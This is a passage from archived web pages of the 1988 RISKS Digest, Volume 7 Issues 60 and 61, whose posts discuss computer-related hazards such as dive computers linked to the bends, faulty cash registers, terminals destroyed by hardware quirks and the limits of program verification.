software magazine, Dr. Dobb's Journal of Computer Calisthenics and Orthodontia.
He later served as the original host of the PBS series, "Computer Chronicles,"
and was awarded the first Sybex Computer Pioneer Award which recognizes
innovators in the microcomputer field. In the academic arena, Mr. Warren has
taught computer science at  San Francisco State, San Jose State and Stanford
University.  Mr. Warren's speech, Computers, Information, and Politics, will
focus on how citizens can gain access to computerized information on
individuals, corporations, and the government, and how they can use that
information to bring about effective political action, locally or globally. 

During the banquet, the CPSR Board of Directors will present the Norbert Wiener
Award for Professional and Social Responsibility to Joseph Weizenbaum,
professor of computer science (emeritus) at the Massachusetts Institute of
Technology.

Sessions on Sunday, November 20, will be devoted to the organization and future
direction of the association.  Speakers include:  Terry Winograd, associate
professor of computer science at Stanford University and co-author of
Understanding Computers and Cognition,;  grassroots organizer and trainer John
Spearman, senior contract administrator for The Doctor's Council in New York
City;  Steve Zilles, chairman of the board of directors, CPSR;  and Gary
Chapman, executive director of CPSR and co-editor of Computers in Battle. 

Registration fees for the meeting are as follows:  $10/members; $20/nonmembers
before November 9;  $20/members, $30/nonmembers after November 9.  The banquet
is $30/members, $35/nonmembers.  Reservations are on a first-come, first-served
basis. Please call (415) 322-3778 for registration material.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.58.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.60.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-12</DOCNO>
<DOCOLDNO>IA012-000131-B034-239</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.60.html 128.240.150.127 19970217023327 text/html 20250
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:31:32 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 60</TITLE>
<LINK REL="Prev" HREF="/Risks/7.59.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.61.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.59.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.61.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 60</H1>
<H2> Monday 1 October 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Diving Computers 
</A>
<DD>
<A HREF="#subj1.1">
Brian Randell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  The Perils of PCs in Public 
</A>
<DD>
<A HREF="#subj2.1">
Dave Horsfall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  A New Portal for the Offensive -- FAX ATTACKS 
</A>
<DD>
<A HREF="#subj3.1">
Scott Rose
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Is Uncle Sam selling your name? -- Maybe not. 
</A>
<DD>
<A HREF="#subj4.1">
Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Is UMASS selling your name to mailing lists? 
</A>
<DD>
<A HREF="#subj5.1">
Andrew Klossner
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Write your credit card number on a business reply card? 
</A>
<DD>
<A HREF="#subj6.1">
David Sherman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Killer terminals     
</A>
<DD>
<A HREF="#subj7.1">
Michael Fischbein
</A><br>
<A HREF="#subj7.2">
 Bill Witts
</A><br>
<A HREF="#subj7.3">
 both via Mark Brader from comp.misc
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  This train didn't need a fireman 
</A>
<DD>
<A HREF="#subj8.1">
earl via Chuck Weinstock
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Diving Computers
</A>
</H3>
<address>
Brian Randell 
&lt;<A HREF="mailto:Brian.Randell@newcastle.ac.uk">
Brian.Randell@newcastle.ac.uk
</A>&gt;
</address>
<i>
Sun, 2 Oct 88 13:42:13 +0100
</i><PRE>

Though there has I recall been discussion in RISKS before about diving
computers, I have not before seen any publicity about problems in the UK. Here
is an article from the Sunday Times for 2 October 1988, reprinted in its
entirety, without permission.
 
Brian Randell

         [See <A HREF="/Risks/6.51.html">RISKS-6.51</A>, 53, 55, 57, 59, 60, 63 for previous discussion!  PGN]
 
 
                  DIVERS BLAME WRIST COMPUTER FOR `BENDS'
                          by Richard Ellis
 
Officials of Britain's biggest sub-acqua club are promoting computers for
divers that some experts have condemned as potentially dangerous, and which
could lead to divers getting compression sickness, or "the bends".
 
Two senior officials, including the chairman, of the 35,000 strong British
Sub-Acqua club have financial links with a company that distributes one brand
of the computers in Britain. Diving computers have been branded as potentially
unsafe by Royal Navy diving experts, who say that they may be contributing to a
rise in the number of divers suffering from the bends.
 
Sub-acqua club officials have been advised of the navy's concern, and of the
worries of one branch where two divers using computers suffered the beds, but
the officials have continued to advise members that the computers are safe,
without declaring their financial interests.
 
The wrist-strap computers are designed to tell divers how long they can stay
underwater and indicate how long they need to stop while ascending to avoid the
bends. The traditional method is for divers to use a printed table supplied by
the club.
 
The Institute for Naval Medecine, in Gosport, Hampshire, says that the cases
of decompression sickness it has dealt with have doubled in the past year,
during which time computers have become popular in Britain.
 
It says the computer software may be based on unsafe data, that it does not
take into account such factors as age, fitness, sex and exertion, and therefore
gives divers a false sense of security. Doctors at the institute last week
called for extensive safety trials.
 
Surgeon Captain Ramsay Pearson, the institute's head of undersea medicine,
said 34 of 80 cases of decompression sickness dealt with there this year
involved the use of computers. "People are relying absolutely on the computers,
and they are allowing people to do things we think to be unsafe," he said.
 
In August, the Brighton branch of the club wrote to senior club officials after
two of its members needed treatment for the bends. Both had been wearing an
Aladin dive computer, one of five brands available in Britain. The branch asked
why no warning about the potential dangers of computers had been issued by the
national headquarters.
 
The branch received a strongly worded six-page letter from Mike Holbrook,
chairman of the club, dismissing the complaint as "mischief-making". He claimed
there was no evidence of any problem with the Aladin, saying the data on which
it was based was "tried and tested".
 
What the letter did not reveal is that Holbrook's full-time job is as a diving
consultant for Spirotechnique (UK) Ltd, one of two importers and distributors
of the Swiss-made Aladin computer in Britain.
 
The managing director of Spirotechnique (UK), a subsidiary of a French firm,
is Mike Busuttili, another leading member of the club, who is its former
national diving officer and now a member of its decompression working party.
 
Around 5,000 of Britain's 50,000 divers now use computers. The Aladin, at a
relatively cheap (pounds)199, has been one of the most popular brands.
 
Holbrook last week denied that there was anything improper about his twin
roles. He said: "What's wrong? Can I not be objective? I think I can." He
claimed club figures showed there had not been a rise in the number of divers
getting the bends, and that investigations into cases of the bends where
computers had been blamed had established other factors were responsible.
 
But Mickey Miller, chairman of the Brighton branch, said many of the 230 divers
in his branch were worried, "Until this summer we had had just three cases of
decompression sickness since we were formed in 1953. Now we have doubled
that."
 
One of the three recent cases was Miller himself, though he was not using a
computer. The two other Brighton men who got the bends - bubbles of gas that
form in the blood and can cause paralysis or death - were using the Aladin.
 
They suffered slight numbness and recovered quickly. But a scan later showed
two lesions on the brain of one of them, Peter van der Boon, a businessman.
They have not affected his health.
 
Van der Boon, 37, a diver for 18 years, blames the computer for his attack. "It
said I was in the clear, but it was not the case obviously. If there had been
the slightest whisper from the national office about any problems, then I would
not have got the bends. Now I only use the computer as a backup."
 
The Swiss firm Uwatec, which makes the Aladin, yesterday rejected allegations
the gadget may be unsafe.
 
Ernst Voellm, the development engineer who helped produce Aladin, said 50,000
computers had been sold worldwide since 1983, and just a "handful" of cases of
divers developing decompression sickness with them had come to their attention.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
The Perils of PCs in Public
</A>
</H3>
<address>
&lt;<A HREF="mailto:Dave Horsfall <dave@stcns3.stc.oz.au> ">
Dave Horsfall &lt;dave@stcns3.stc.oz.au&gt; 
</A>&gt;
</address>
<i>
Fri, 30 Sep 88 12:08:23 est
</i><PRE>

From the "Rumour Central" column in PC Week, Sep 15:

``...  On Thursday August 25, I was attempting to make a connection at
  Adelaide airport when a blackout occurred.  Emergency lighting only,
  no PA system, no Arrivals and Departure screens, no seat allocation
  computer, and so on.  When normality was finally restored, what should
  appear on the Australian Airlines monitor but a cute little picture of
  a hand holding a 3.5in disk with the familiar label 'Amiga KickStart'!
  Nobody did KickStart the thing for the next half-hour before I boarded
  the plane.  For all I know, the passengers are still seeing this ghostly
  hand instead of Arrivals and Departures.  It seems that Australian
  Airlines' mainframe is not up to the job of displaying a list of
  Arrivals and Departures details in pretty colours.''

Although the intent of the article was about how PCs are being used in
places where one expects to find a mainframe, I couldn't help but be
amused by the RISKs present - no backup supply for the display computer,
no auto-boot sequence, the possible harm to public relations when no-one
realised the Amiga needed to be booted, etc.

Dave Horsfall (VK2KFU),  Alcatel-STC Australia,  dave@stcns3.stc.oz
dave%stcns3.stc.OZ.AU@uunet.UU.NET,  ...munnari!stcns3.stc.OZ.AU!dave
    PCs haven't changed computing history - merely repeated it

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
A New Portal for the Offensive -- FAX ATTACKS 
</A>
</H3>
<address>
Scott Rose 
&lt;<A HREF="mailto:rose@cs.wisc.edu">
rose@cs.wisc.edu
</A>&gt;
</address>
<i>
Fri, 30 Sep 88 20:15:05 -0500
</i><PRE>

Yesterday's Wall Street Journal had a hilarious (at least, at first...) 
front page article about the rapidly growing practice of sending advertisements
to FAX machines.  Besides being offensive, this technique is also reportedly
very effective, because people tend to read their FAX traffic very carefully.
So effective that an outfit in NYC is reported to be rewarding those who
provide a list of 100 new FAX numbers with a new Sony Walkperson.

As personal FAX machines start becoming commonplace, there will surely be an
epidemic of obscene transmissions.  Unfortunately, a picture can be worth ten
thousand words.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Is Uncle Sam selling your name? -- Maybe not.
</A>
</H3>
<address>
Mark Brader 
&lt;<A HREF="mailto:msb@sq.sq.com">
msb@sq.sq.com
</A>&gt;
</address>
<i>
Sun, 2 Oct 88 14:53:02 EDT
</i><PRE>

I forwarded from misc.consumers to Risks 7.59 an article reading in part:

&gt; &gt; For the last two weeks I've been swamped with pre-approved credit cards 
&gt; &gt; and loans, at least three offers every day from different banks. The 
&gt; &gt; strange part is the they are all addressed to my legal name which is only 
&gt; &gt; known by Uncle Sam and his red tape offices.

There have since been several follow-up postings recounting similar stories,
and several followup posting pointing out that information "only known by
Uncle Sam" is often a matter of public record if you know where to look.  So
while some data may be being distributed illicitly, in other cases, Freedom
of Information laws are responsible for junk mail.

Mark Brader, SoftQuad Inc., Toronto, utzoo!sq!msb, msb@sq.com
	The lawgiver, of all beings, most owes the law allegiance.
	He of all men should behave as though the law compelled him.
	But it is the universal weakness of mankind that what we are
	given to administer we presently imagine we own.  -- H.G. Wells

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Is UMASS selling your name to mailing lists?
</A>
</H3>
<address>
Andrew Klossner 
&lt;<A HREF="mailto:andrew%frip.gwd.tek.com@RELAY.CS.NET">
andrew%frip.gwd.tek.com@RELAY.CS.NET
</A>&gt;
</address>
<i>
Mon,  3 Oct 88 12:19:10 PDT
</i><PRE>

[]
	"They said the school did not sell mailing lists, and refused
	to believe there was any connection between the insurance
	mailing and the UMass database.  "Maybe someone went through
	the phone book," they suggested.  Sheesh."

Sheesh yourself.  My first summer job (as a teenager) was to do just
that -- manually key the UCSB phone book into a junk mailing list.

  -=- Andrew Klossner   (decvax!tektronix!tekecs!andrew)       [UUCP]
                        (andrew%tekecs.tek.com@relay.cs.net)   [ARPA]
Organization: Tektronix, Wilsonville, Oregon

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
write your credit card number on a business reply card?
</A>
</H3>
<address>
David Sherman
&lt;<A HREF="mailto:dave@lsuc.UUCP ">
dave@lsuc.UUCP 
</A>&gt;
</address>
<i>
29 Sep 88 08:49:25 EDT (Thu)
</i><PRE>

The pre-registration card for the Canadian Computer Show, to be held in Toronto
in November, invites you to send in the card with a cheque, or simply fill in
your credit card number and expiry date and sign the card.  It's got a business
reply (no postage required) address on the back, so you just have to drop it in
the mail.

Right.

The computer angle is that it's for the country's largest COMPUTER SHOW! These
people should know better.

David Sherman, The Law Society of Upper Canada    attcan!lsuc!dave@uunet.uu.net

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Killer terminals
</A>
</H3>
<address>
Mark Brader 
&lt;<A HREF="mailto:msb@sq.sq.com">
msb@sq.sq.com
</A>&gt;
</address>
<i>
Thu, 29 Sep 88 19:12:57 EDT
</i><PRE>

Michael Fischbein (msf@prandtl.nas.nasa.gov) writes:  [in comp.misc]

  I worked designing microprocessor based fire and security
  alarm systems for skyscrapers, back when microprocessors were a
  brand new idea.  Well, we had development systems from two
  vendors and only one terminal.  I came up with a cable to hook
  the ASR-33 up to the other development system so we didn't have to wait
  for that vendor to get a terminal to us.  I carefully checked the
  connections, plugged the cable into the terminal and put a trusty VOM
  on the connections to make sure the signals were right.

  OK. Both off, connect the ASR-33 to the computer.  Turn on the
  computer.  Turn on the teletype. POP! Hissss... Yank both cords out
  of the power strip.  Notice blue smoke coming out of the computer.
  Go back and measure the signals on the data connector with
  an O-scope.  Gee, there's a 40 volt AC square wave superimposed on the
  TTL signal.....

  We tell the vendor of system 1 (that supplied the teletype) what's
  wrong with the teletype and ask for a replacement.  No, that's the way
  it is supposed to work.  Yep, sure it is.  That's OK, they'll install it
  on their development system.

  They plug the teletype to their machine when it arrives.  POP!
  Hisss...  They take it to their local distribution center, the
  service engineer checks it out thoroughly, ``repairs'' it, hooks it up
  to one of their systems.  POP! Hisss....  Two systems later, he admits
  mystification and ships the killer teletype back to the factory in
  California.  Last I heard, the teletype had vaporized three systems
  back at the factory and they couldn't figure out what was wrong.

  		mike

  Michael Fischbein                 msf@prandtl.nas.nasa.gov
                                 ...!seismo!decuac!csmunix!icase!msf
  These are my opinions and not necessarily official views of any
  organization.

</PRE>
<HR><H3><A NAME="subj7.2">
Killer terminals
</A>
</H3>
<address>
Mark Brader 
&lt;<A HREF="mailto:msb@sq.sq.com">
msb@sq.sq.com
</A>&gt;
</address>
<i>
Thu, 29 Sep 88 19:12:57 EDT
</i><PRE>

Bill Witts (william@cs.ucl.ac.uk) writes:     [in comp.misc]

  I used Televideo 910 terminals as an undergrad, and when you logged off,
  the system cleared your screen. Once, I typed LOGOFF and then realised
  I needed the data currently on the screen, so I hit CTRL-S hard just
  as the first carriage returns came through to scroll the screen.  And
  the terminal just stopped - no logoff message, nothing - and nothing
  that I did made any difference.  It was definitely the terminal that
  went, as I tried plugging different terminals into the same socket,
  and power-off didn't help.  I couldn't believe this, so I replicated the
  situation and killed another terminal.

  Later on, I mentioned this to a friend who didn't believe it either, so
  he promptly killed one and demoed it to someone else.  Within an hour,
  half of the college terminals were extinct which was amazingly popular
  as it was the middle of the project season, and about a week later
  the dead terminals were taken away and were replaced after a further week.

  			... Bill

  Bill Witts, CS Dept.  UCL, London, Errrp    william@cs.ucl.ac.uk

</PRE>
<HR><H3><A NAME="subj7.3">
This train didn't need a fireman
</A>
</H3>
<address>
Chuck Weinstock 
&lt;<A HREF="mailto:weinstoc@SEI.CMU.EDU">
weinstoc@SEI.CMU.EDU
</A>&gt;
</address>
<i>
Wed, 28 Sep 88 10:27:40 EDT
</i><PRE>

The following was found on the rec.railroad netnews.  For background,
the Great Northern Railroad, now a part of the Burlington Northern,
has a long tunnel in northern Washington State (I forget how long, but
I seem to remember something like 8 miles.)  In the days of steam
engines this presented a breathing problem so the railroad electrified
its operations through the tunnel, and would exchange electric
locomotives for steam at each end of the electrified district.

Chuck Weinstock

&gt; From: earl@phred.UUCP (choo choo earl)
&gt; Subject: Re: WHAT IF the Great Northern ?
&gt; Keywords: anecdote
&gt; Date: 28 Sep 88 00:38:39 GMT
&gt; Reply-To: earl@phred.UUCP (choo choo earl)
&gt; Summary:It's Electric
&gt; 
&gt; My dad related a story about the Great Northern electrification. He said that
&gt; the Forest Service had its central office for the fire lookout telephones
&gt; in Skykomish, the change point to electric. It seems that the ringers in the
&gt; phones were 20Hz, and the trains were 25Hz. When a train pulled out headed
&gt; for the tunnel, ALL of the phones in all of the fire lookouts would ring
&gt; continuously until the train was over the hump.
&gt; 
&gt; Just something I thought people might like
&gt; earl

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.59.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.61.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-13</DOCNO>
<DOCOLDNO>IA012-000131-B034-253</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.61.html 128.240.150.127 19970217023346 text/html 16135
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:32:15 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 61</TITLE>
<LINK REL="Prev" HREF="/Risks/7.60.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.62.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.60.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.62.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 61</H1>
<H2> Tuesday 4 October 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Program Verification: The very idea 
</A>
<DD>
<A HREF="#subj1.1">
Brian Randell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  RISKS of EPROMS 
</A>
<DD>
<A HREF="#subj2.1">
Daniel Klein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Poor user interface -- police system 
</A>
<DD>
<A HREF="#subj3.1">
rpg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Cash registers and tax 
</A>
<DD>
<A HREF="#subj4.1">
J Eric Townsend
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Cash registers 
</A>
<DD>
<A HREF="#subj5.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Fly-by-wire, absence thereof [MiG-29] 
</A>
<DD>
<A HREF="#subj6.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: A New Portal For The Offensive -- FAX ATTACKS 
</A>
<DD>
<A HREF="#subj7.1">
Greeny
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: Is Uncle Sam selling your name to mailing lists? 
</A>
<DD>
<A HREF="#subj8.1">
Matthew Huntbach
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  More on monitoring Cellular Phones 
</A>
<DD>
<A HREF="#subj9.1">
Mike Linnig
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Program Verification: The very idea
</A>
</H3>
<address>
Brian Randell 
&lt;<A HREF="mailto:B.Randell@newcastle.ac.uk">
B.Randell@newcastle.ac.uk
</A>&gt;
</address>
<i>
Wed, 5 Oct 88 9:56:39 WET DST
</i><PRE>

I have just finished reading, with great interest and enjoyment, an article by 
J.H. Fetzer with  the above title, which appeared in Comm ACM 31,9 (Sept. 88) 
pp. 1048-1063. 

In my opinion it is a very careful and lucid analysis of the dispute between,
e.g., DeMillo, Lipton and Perlis on the one hand, and Hoare on the other,
regarding the nature of programming and the significance of program
verification. Its abstract is as follows:

  The notion of program verification appears to trade on an equivocation. 
  Algorithms, as logical structures, are appropriate structures for deductive
  verification. Programs, as causal models of these structures, are not. The
  success of program verification as a generally applicable and completely 
  reliable method of guaranteeing program performance is not even a theoretical
  possibility.

The final chapter, entitled "Complexity and Reliability", is the one which most
explicitly relates to the interests of the RISKS readership but its
understanding requires a careful reading of much of the earlier part of the
paper. The final chapter, incidentally ends as follows:

  In maintaining that program verification cannot succeed as a generally
  applicable and completely reliable method for guaranteeing the performance of
  a program, DeMillo, Lipton and Perlis thus arrived at the right general 
  conclusion for the wrong specific reasons. Still, we are indebted to them for
  their efforts to clarify a conclusion whose potential consequences - not only
  for the community of computer science, but for the human race - cannot be
  overstated and had best be understood.

Brian Randell

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
RISKS of EPROMS
</A>
</H3>
<address>
Daniel Klein - 412/268-7791 
&lt;<A HREF="mailto:dvk@SEI.CMU.EDU">
dvk@SEI.CMU.EDU
</A>&gt;
</address>
<i>
Fri, 30 Sep 88 13:00:55 EDT
</i><PRE>

The UV eraseable EPROMS that are found in many smaller computers are also
subject to failure when their picture is taken.  Yep, you read that correctly.
Once when I worked for the Computer Engineering Center, we were taking
publicity photos of one of our process control systems.  The system was
working just fine, but as soon as we took the photo, it crashed.
Surprisingly, the system right next to it did not.  We rebooted, the
processor, took another photo, and "blam", it crashed again.  What was
happening was as follows: the system that was crashing had the lid off, while
the one running had the lid on.  When we swapped the lid, the system that
crashed changed also.  We discovered that it was the flash that was causing
the problems, and the either there ws enough UV being emitted from the flash,
or simply that the light intensity was high enough to confuse the EPROMS for a
few machine cycles, and cause bogus information to reach the CPU, crashing it.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Poor user interface -- police system
</A>
</H3>
<address>
&lt;<A HREF="mailto:rpg@CS.BROWN.EDU ">
rpg@CS.BROWN.EDU 
</A>&gt;
</address>
<i>
Mon, 3 Oct 88 21:07:09 EDT
</i><PRE>

Reprinted without permission from the Providence New Paper:

    Providence Police Chief Walter Clark was grilled on his department's
  position on police/minority relationships, the effects of drugs on the
  community, and the speed and attitude of officers responding to calls.
  Answers and solutions were prompt.

    Chief Clark explained that all calls to the police department are
  entered into a computer and prioritized, but only the 20 or so reports
  visible on the CRT can be acted on.  Which is why it can take two hours for
  the police to respond to a burglary after the fact, as opposed to more
  immediate response to a burglary in progress.

It astounds me that the writers of such a piece of software wouldn't have
provided for the display to scroll, especially considering that there are
problems of starvation like this.  And what happens if there is a disaster,
like the New York blackout and widespread crime, such that there are more
than 20 urgent calls to be managed?

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Cash registers and tax
</A>
</H3>
<address>
j eric townsend
&lt;<A HREF="mailto:erict%flatline@sri-unix.UUCP ">
erict%flatline@sri-unix.UUCP 
</A>&gt;
</address>
<i>
26 Sep 88 20:23:26 CDT (Mon)
</i><PRE>

During a break between classes the other day, I decided to restart my tradition
of the "perfect student lunch": beer and grease.  I got my usual:  pizza,
$1.50, and a domestic beer, $1.50. (Ouch, time to put the cooler back in the
car... :-).  I went to the register, and the button-pusher told me I owed
$3.18.  Normally, tax isn't charged on food at UH.  What you see is how much it
costs, EOL.  I asked the clerk about this, as I'd gotten the same thing the day
before, and it had only cost $3.

 The clerk replied: "Oh, you probably got it at the other register.  This
 is the only register that charges tax."
  
 Me:  "Well, give me back my $.18, then, since you don't normally charge tax."

 Clerk: "Sorry, I can't do that, because the cash register says you owe $3.18."

There was a manager standing nearby who couldn't tell me if I owed tax or not...

Moral:  If you eat in the Satellite at UH, don't go to the far left register,
it charges 8 percent tax while the other registers don't.

(Actually, I think that UH adds the tax into the price of the food just
to make it easier to figure out your bill.  Then, the spend $$$'s trying
to reverse-engineer their retail costs... :-)

J. Eric Townsend, 511 Parker #2, Houston, Tx, 77007
Inet: COSC3AF@george.uh.edu             UUCP:  uunet!nuchat!flatline!erict
Bitnet: COSC3AF@UHVAX1.BITNET            ..!bellcore!tness1!/

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Cash registers
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:Neumann@KL.SRI.COM">
Neumann@KL.SRI.COM
</A>&gt;
</address>
<i>
Thu, 29 Sep 88 14:29:39 PDT
</i><PRE>

We have previously had several tales such as the following, prompting someone
to note that segmented number generators initially display an "8" in each
position so that someone who is paying attention would notice when a segment is
burned out.  But in this case someone would have to use mirrors.

At lunch the scale for salads etc. has digital displays on two sides.  I was on
one side, the cashier on the other.  She told me the amount -- $1.93.  I noted
that it said $1.83 on my side.  She insisted that MY side had been wrong before
that day and that they were using HER side.  When told that the reason her side
said "8" instead of "9" was that one of the segments was burned out, she
finally acquiesced.  But it occurred to me that a different segment had
probably been out on my side, presumably in the units digit, which is what had
